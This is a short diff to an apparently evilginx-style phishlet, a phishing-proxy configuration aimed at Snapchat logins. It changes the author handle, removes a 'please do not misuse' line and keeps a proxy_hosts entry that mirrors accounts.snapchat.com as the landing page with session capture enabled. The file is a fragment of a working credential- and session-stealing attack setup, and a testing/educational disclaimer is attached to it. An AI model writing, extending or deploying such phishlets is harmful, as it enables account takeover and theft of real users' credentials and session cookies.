@@ -1,7 +1,7 @@
 # AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
-# PLEASE DO NOT MISUSE THIS PHISHLET.
+# Updated Snapchat Phishlet
 
-author: '@an0nud4y'
+author: '@Tizzmo'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
